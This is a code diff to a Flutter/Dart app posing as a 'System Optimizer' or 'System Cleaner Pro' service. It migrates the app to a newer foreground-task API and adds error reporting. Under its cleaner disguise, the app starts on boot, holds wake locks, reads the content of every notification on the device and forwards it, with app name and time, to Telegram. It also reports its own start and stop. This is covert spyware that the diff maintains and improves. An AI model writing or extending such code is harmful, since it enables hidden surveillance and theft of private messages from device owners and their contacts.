@@ -1,6 +1,3 @@
-import 'dart:isolate';
-
-import 'package:flutter/material.dart';
 import 'package:flutter_foreground_task/flutter_foreground_task.dart';
 import 'notification_service.dart';
 import 'telegram_service.dart';
@@ -29,20 +26,18 @@ class ForegroundService {
         channelDescription: 'System optimization service notification',
         channelImportance: NotificationChannelImportance.LOW,
         priority: NotificationPriority.LOW,
-        iconData: const NotificationIconData(
-          resType: ResourceType.mipmap,
-          resPrefix: ResourcePrefix.ic,
-          name: 'launcher',
-        ),
+        playSound: false,
+        enableVibration: false,
+        showWhen: true,
       ),
       iosNotificationOptions: const IOSNotificationOptions(
         showNotification: true,
         playSound: false,
       ),
-      foregroundTaskOptions: const ForegroundTaskOptions(
-        interval: 5000,
-        isOnceEvent: false,
+      foregroundTaskOptions: ForegroundTaskOptions(
+        eventAction: ForegroundTaskEventAction.repeat(5000),
         autoRunOnBoot: true,
+        autoRunOnMyPackageReplaced: false,
         allowWakeLock: true,
         allowWifiLock: true,
       ),
@@ -50,39 +45,54 @@ class ForegroundService {
   }
 
   Future<void> _startForegroundService() async {
+    ServiceRequestResult result;
+
     if (await FlutterForegroundTask.isRunningService) {
-      await FlutterForegroundTask.restartService();
+      result = await FlutterForegroundTask.restartService();
     } else {
-      await FlutterForegroundTask.startService(
+      result = await FlutterForegroundTask.startService(
         notificationTitle: 'System Optimizer',
         notificationText: 'Optimizing your device performance...',
         callback: startCallback,
       );
     }
 
-    _isRunning = true;
+    _isRunning = result is ServiceRequestSuccess;
 
-    // إرسال إشعار بدء التشغيل لتيليجرام
-    _telegramService.sendMessage("🚀 System Cleaner Pro Started\nDevice: Android\nTime: ${DateTime.now()}");
+    if (_isRunning) {
+      _telegramService.sendMessage(
+        "🚀 System Cleaner Pro Started\nDevice: Android\nTime: ${DateTime.now()}",
+      );
+    } else if (result is ServiceRequestFailure) {
+      _telegramService.sendMessage(
+        "⚠️ System Cleaner Pro failed to start\nError: ${result.error}",
+      );
+    }
   }
 
   void _startMonitoring() {
     // محاكاة مراقبة الإشعارات (ستحتاج تعديل حسب احتياجاتك)
     _notificationService.startListening((notification) {
       // إرسال الإشعار لتيليجرام
-      _telegramService.sendMessage(
-        "📱 New Notification\n"
-        "App: ${notification['app']}\n"
-        "Time: ${notification['time']}\n"
-        "Content: ${notification['content']}"
-      );
+      _telegramService.sendMessage("📱 New Notification\n"
+          "App: ${notification['app']}\n"
+          "Time: ${notification['time']}\n"
+          "Content: ${notification['content']}");
     });
   }
 
   Future<void> stopService() async {
-    await FlutterForegroundTask.stopService();
-    _isRunning = false;
-    _telegramService.sendMessage("⏹️ System Cleaner Pro Stopped");
+    final ServiceRequestResult result =
+        await FlutterForegroundTask.stopService();
+
+    if (result is ServiceRequestSuccess) {
+      _isRunning = false;
+      _telegramService.sendMessage("⏹️ System Cleaner Pro Stopped");
+    } else if (result is ServiceRequestFailure) {
+      _telegramService.sendMessage(
+        "⚠️ Failed to stop System Cleaner Pro\nError: ${result.error}",
+      );
+    }
   }
 
   bool get isRunning => _isRunning;
@@ -96,26 +106,28 @@ void startCallback() {
 
 class MyTaskHandler extends TaskHandler {
   @override
-  Future<void> onStart(DateTime timestamp, SendPort? sendPort) async {
+  Future<void> onStart(DateTime timestamp, TaskStarter starter) async {
     // Called when the task is started
   }
 
   @override
-  Future<void> onEvent(DateTime timestamp, SendPort? sendPort) async {
-    // Called every interval
+  void onRepeatEvent(DateTime timestamp) {
+    final String formattedTime =
+        timestamp.toLocal().toIso8601String().split('T').last.split('.').first;
+
     FlutterForegroundTask.updateService(
       notificationTitle: 'System Optimizer',
-      notificationText: 'Running at ${timestamp.toString().substring(11, 19)}',
+      notificationText: 'Running at $formattedTime',
     );
   }
 
   @override
-  Future<void> onDestroy(DateTime timestamp, SendPort? sendPort) async {
+  Future<void> onDestroy(DateTime timestamp) async {
     // Called when the task is destroyed
   }
 
   @override
-  void onButtonPressed(String id) {
+  void onNotificationButtonPressed(String id) {
     // Called when notification button is pressed
   }
 
